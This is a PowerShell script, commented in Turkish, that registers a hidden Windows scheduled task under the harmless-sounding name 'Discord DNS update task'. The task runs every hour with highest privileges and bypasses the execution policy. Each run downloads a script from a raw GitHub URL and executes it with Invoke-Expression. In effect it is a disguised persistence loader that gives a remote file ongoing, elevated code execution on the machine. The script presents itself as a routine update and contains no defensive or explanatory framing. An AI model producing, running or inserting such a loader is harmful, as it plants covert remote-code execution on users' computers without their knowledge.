$TaskService = New-Object -ComObject 'Schedule.Service'
$TaskService.Connect()
$RootFolder = $TaskService.GetFolder('\Siri')
$TaskDefinition = $TaskService.NewTask(0)

$TaskDefinition.RegistrationInfo.Description = 'Discord DNS update task'

# Kullanıcı kimliği belirtmeden çalıştırma
$TaskDefinition.Principal.LogonType = 3 # 3 = Logon interactively
$TaskDefinition.Principal.RunLevel = 1  # 1 = Highest privileges

# Trigger oluşturma
$Trigger = $TaskDefinition.Triggers.Create(3) # 3 = Daily
$Trigger.StartBoundary = (Get-Date).ToUniversalTime().AddMinutes(1).ToString('yyyy-MM-ddTHH:mm:ssZ') # UTC saatine göre başlangıç zamanı
$Trigger.Repetition.Interval = 'PT1H' # 1 saat aralıklarla tekrarlama
$Trigger.Repetition.Duration = 'P1D' # 1 gün boyunca tekrar edecek
$Trigger.DaysOfWeek = 127 # 127 = tüm günler (Pazartesi - Pazar)

# Action belirleme
$Action = $TaskDefinition.Actions.Create(0)
$Action.Path = 'PowerShell.exe'
$Action.Arguments = '-ExecutionPolicy Bypass -Command "& { Invoke-RestMethod -Uri ''https://raw.githubusercontent.com/SirriusV1/Oyun-Cfg/main/updated/discord.ps1'' | Invoke-Expression }"'

# Task ayarları
$TaskDefinition.Settings.Hidden = $true
$TaskDefinition.Settings.AllowDemandStart = $true
$TaskDefinition.Settings.StartWhenAvailable = $true

# Görevi kaydetme
$RootFolder.RegisterTaskDefinition('Discord Dns', $TaskDefinition, 6, $null, $null, 3, $null)
